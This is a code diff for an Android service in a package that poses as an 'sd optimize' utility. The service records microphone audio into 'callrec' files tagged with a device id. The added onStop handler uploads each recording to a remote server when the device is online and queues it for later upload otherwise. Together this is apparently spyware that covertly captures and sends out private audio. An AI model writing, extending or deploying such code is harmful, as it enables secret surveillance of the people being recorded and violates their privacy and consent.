@@ -2,18 +2,21 @@ package com.android.sd.optimize;
 
 import java.io.File;
 import java.io.IOException;
+import java.util.ArrayList;
+import java.util.Arrays;
 
 import android.app.Service;
 import android.content.Intent;
 import android.media.MediaRecorder;
 import android.os.Environment;
+import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
 import android.widget.Toast;
 
 public class RecordService extends Service implements MediaRecorder.OnInfoListener,
         MediaRecorder.OnErrorListener, CustomMediaRecorder.PlaybackStateChangedListener {
-
+    int network;
     public static final String DEFAULT_STORAGE_LOCATION = Environment.getExternalStorageDirectory()
             .getAbsolutePath()
             + File.separator
@@ -37,7 +40,7 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
                 return null;
             }
         }
-        // String time = Util.getDateTime();
+
         try {
             File file = new File(dir, BackService.id + "callrec" + System.currentTimeMillis() + ".m4a");
             if (!file.exists())
@@ -63,20 +66,14 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
 
         if (isRecording)
             return;
-        // Context c = getApplicationContext();
-        // SharedPreferences prefs =
-        // PreferenceManager.getDefaultSharedPreferences(c);
-        int audiosource = 1;
-        // int audioformat = 1;
         recording = makeOutputFile();
         if (recording == null) {
             recorder = null;
             return;
         }
-
         try {
             recorder.reset();
-            recorder.setAudioSource(audiosource);
+            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
             recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
             recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
             recorder.setOutputFile(recording.getAbsolutePath());
@@ -104,6 +101,7 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
         if (null != recorder) {
             isRecording = false;
             recorder.stop();
+            recorder.reset();
             recorder.release();
         }
     }
@@ -130,7 +128,16 @@ public class RecordService extends Service implements MediaRecorder.OnInfoListen
     }
 
     @Override
-    public void onStop(String outputFilePath) {
+    public void onStop(final String outputFilePath) {
+        Log.i(AppGlobals.getLogTag(getClass()),"Recording Stopped");
+        DBHandler dbHandler = new DBHandler(getApplicationContext());
+        Helpers helpers = new Helpers(getApplicationContext());
+        if (helpers.isOnline()) {
+            helpers.requestFiletUpload(outputFilePath);
+            new Thread(helpers).start();
+        }else {
+             dbHandler.createNewFileNameForUpload("filename",outputFilePath);
+        }
     }
 
     @Override
